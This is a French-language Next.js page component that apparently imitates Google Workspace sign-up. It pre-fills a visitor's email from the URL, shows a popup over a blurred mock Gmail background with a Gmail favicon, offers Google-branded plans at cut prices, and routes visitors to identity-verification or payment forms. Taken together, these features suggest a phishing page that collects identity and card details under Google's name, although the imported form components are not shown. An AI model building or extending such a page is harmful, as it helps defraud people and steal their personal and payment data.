import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import { PageHead } from '../hooks/usePageMeta';
import layoutStyles from '../styles/components/Layout.module.css';
import PlanSelection from '../components/PlanSelection';
import VerificationForm from '../components/VerificationForm';
import PaymentForm from '../components/PaymentForm';

const Confirmation = () => {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [firstName, setFirstName] = useState('');
  const [currentStep, setCurrentStep] = useState('selection'); // 'selection', 'verification', 'payment'
  const [selectedPlan, setSelectedPlan] = useState(null);

  // Récupérer l'email et le prénom depuis l'URL au chargement
  useEffect(() => {
    if (router.query.email) {
      setEmail(router.query.email);
    }
    if (router.query.firstName) {
      setFirstName(router.query.firstName);
    }
  }, [router.query.email, router.query.firstName]);

  const planDetails = {
    free: {
      title: 'Personnel',
      price: '0€',
      period: '/mois',
      description: 'Gratuit à vie',
      features: [
        'Calendrier Google illimité',
        'Réunions Google Meet sécurisées',
        '15 Go de stockage Google Drive',
        'Gmail avec domaine personnel',
        'Documents Google collaboratifs'
      ],
      policies: [
        'Aucun engagement - Service gratuit à vie',
        'Vérification du compte requise pour la sécurité',
        'Limites d\'utilisation standard de Google',
        'Support communautaire disponible',
        'Données stockées selon les standards Google'
      ]
    },
    starter: {
      title: 'Business Starter',
      price: '4€',
      originalPrice: '6€',
      period: '/mois',
      description: 'Par utilisateur',
      features: [
        'Tout du plan Personnel',
        '30 Go de stockage Google Drive',
        'Réunions jusqu\'à 100 participants',
        'Enregistrement de réunions',
        'Support par e-mail prioritaire',
        'Administration et sécurité',
        'Gestion centralisée des utilisateurs'
      ],
      policies: [
        '30 jours d\'essai gratuit sans engagement',
        'Facturation mensuelle - Annulation à tout moment',
        'Support prioritaire par email sous 24h',
        'Conformité aux standards de sécurité Google',
        'Sauvegarde automatique et sécurisée des données'
      ]
    },
    premium: {
      title: 'Business Standard',
      price: '8€',
      originalPrice: '12€',
      period: '/mois',
      description: 'Par utilisateur',
      features: [
        'Tout du plan Business Starter',
        '2 To de stockage par utilisateur',
        'Réunions jusqu\'à 150 participants',
        'Enregistrement direct dans Drive',
        'Support téléphonique 24/7',
        'Outils d\'approbation et validation',
        'Recherche et intelligence avancées',
        'Audit et rapports détaillés'
      ],
      policies: [
        '30 jours d\'essai gratuit sans engagement',
        'Facturation mensuelle flexible',
        'Support téléphonique 24h/24, 7j/7',
        'Sécurité avancée et contrôles d\'administration',
        'Conformité aux réglementations internationales',
        'Archivage et e-discovery intégrés'
      ]
    }
  };

  const handleSelectPlan = (planType) => {
    setSelectedPlan(planType);
    if (planType === 'free') {
      // Pour le plan gratuit, aller directement à la vérification
      setCurrentStep('verification');
    } else {
      // Pour les plans payants, aller directement au paiement
      setCurrentStep('payment');
    }
  };

  const handleConfirmPlan = () => {
    if (selectedPlan === 'free') {
      // Pour le plan gratuit, aller à la vérification d'identité
      setCurrentStep('verification');
    } else {
      // Pour les plans payants, aller à l'étape de paiement
      setCurrentStep('payment');
    }
  };

  const handleBackToSelection = () => {
    setCurrentStep('selection');
    setSelectedPlan(null);
  };

  const handleVerificationComplete = () => {
    // Redirection après vérification réussie
    router.push('/trial-activation');
  };

  const handlePaymentComplete = () => {
    // Redirection après paiement réussi
    router.push('/success');
  };

  return (
    <>
      <PageHead 
        title="Confirmation de réservation"
        description="Confirmez votre réservation et choisissez votre forfait de service"
        options={{
          keywords: 'confirmation, forfait, réservation, paiement',
          favicon: '/gmail-favicon.ico'
        }}
      />
      <div className={layoutStyles.container}>
      {/* Background Gmail avec filtre flou */}
      <div className={layoutStyles.background}></div>
      <div className={layoutStyles.overlay}></div>
      
      {/* Popup de confirmation */}
      <div className={layoutStyles.popup}>
        <div className={layoutStyles.popupContentMinimal}>
          {currentStep === 'selection' && (
            <PlanSelection 
              planDetails={planDetails} 
              onSelectPlan={handleSelectPlan} 
            />
          )}
          {currentStep === 'verification' && (
            <VerificationForm 
              onBack={handleBackToSelection}
              onComplete={handleVerificationComplete}
            />
          )}
          {currentStep === 'payment' && (
            <PaymentForm 
              plan={planDetails[selectedPlan]}
              onBack={handleBackToSelection}
              onComplete={handlePaymentComplete}
            />
          )}
        </div>
      </div>
    </div>
    </>
  );
};

export default Confirmation;
